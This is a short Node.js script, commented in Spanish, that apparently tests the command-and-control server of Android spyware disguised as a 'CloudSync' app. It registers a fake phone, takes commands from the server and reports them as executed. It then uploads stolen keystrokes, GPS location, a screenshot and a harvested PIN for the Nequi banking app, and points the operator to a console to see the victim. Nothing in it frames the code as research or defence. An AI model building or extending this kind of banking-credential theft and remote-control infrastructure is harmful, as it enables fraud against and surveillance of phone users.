/* Simula un dispositivo. Uso: node test-client.js https://tu-url.onrender.com */
'use strict';
const BASE = process.argv[2] || 'http://localhost:3000';
const H = { 'Content-Type': 'application/json', 'User-Agent': 'CloudSync/2.1.4 (Android 13; SM-A135M)' };
let id = null, token = null;

const post = async (p, body, auth = true) => {
  const headers = Object.assign({}, H);
  if (auth && id) { headers['X-Sync-Id'] = id; headers['X-Sync-Key'] = token; }
  const r = await fetch(BASE + p, { method: 'POST', headers, body: JSON.stringify(body || {}) });
  const d = await r.json().catch(() => ({}));
  console.log('  ' + (r.status < 300 ? 'OK ' : 'ERR') + ' ' + p + ' -> ' + JSON.stringify(d).slice(0, 200));
  return { status: r.status, data: d };
};

(async () => {
  console.log('== 1. registro ==');
  const reg = await post('/api/v1/sync/register', {
    label: 'PC-de-prueba', platform: 'android', model: 'SM-A135M', os_ver: '13',
    app_ver: '2.1.4', sdk: '33', locale: 'es-CO', protocol: '2.1.4'
  }, false);
  if (!reg.data.ok) process.exit(1);
  id = reg.data.device_id; token = reg.data.token;

  console.log('== 2. beacon ==');
  const b = await post('/api/v1/sync/beacon', { battery: 87, charging: true, net: 'wifi', screen_on: true });
  for (const c of (b.data.commands || [])) {
    await post('/api/v1/sync/result', { id: c.id, ok: true, result: 'ejecutado ' + c.cmd });
  }

  console.log('== 3. push ==');
  const png = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';
  await post('/api/v1/sync/push', {
    events: [
      { ts: Date.now(), type: 'app', data: { pkg: 'com.nequi.MobileApp', ev: 'foreground', secs: 42 } },
      { ts: Date.now(), type: 'key', data: { text: '4 8 1 5 9 2' } },
      { ts: Date.now(), type: 'loc', data: { lat: 4.7110, lon: -74.0721, acc: 12 } }
    ],
    creds: [{ ts: Date.now(), pkg: 'com.nequi.MobileApp', kind: 'pin', username: '3123456789', secret: '4815' }],
    shots: [{ ts: Date.now(), hash: 'abc123', w: 540, h: 1200, mime: 'image/png', screen: 'main', data: png }]
  });

  console.log('== 4. health ==');
  const h = await fetch(BASE + '/api/v1/health');
  console.log('  ' + await h.text());
  console.log('\nAbre ' + BASE + '/console/ y deberias ver "PC-de-prueba".');
})();
